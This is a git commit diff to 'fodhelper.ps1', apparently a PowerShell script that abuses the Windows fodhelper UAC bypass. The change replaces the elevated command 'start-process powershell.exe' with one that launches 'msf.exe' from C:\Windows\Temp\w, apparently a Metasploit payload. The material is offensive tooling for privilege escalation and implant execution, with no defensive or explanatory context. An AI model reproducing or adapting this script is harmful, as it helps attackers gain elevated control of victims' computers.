4d492eaeaeabe2ed6b0ffd16c40fec1ac028652b
ShorterKing <84120105+ShorterKing@users.noreply.github.com>
2025-03-28 19:36:24 +0530

    Update fodhelper.ps1

--- fodhelper.ps1
+++ fodhelper.ps1
@@ -47,7 +47,7 @@ try {
 # Define the commands to execute with elevated privileges
 $CommandsToExecute = @"
 # Define your commands here
-start-process powershell.exe
+ start C:\Windows\Temp\w\msf.exe
 "@
 
 # Write the commands to a script file in the hidden folder
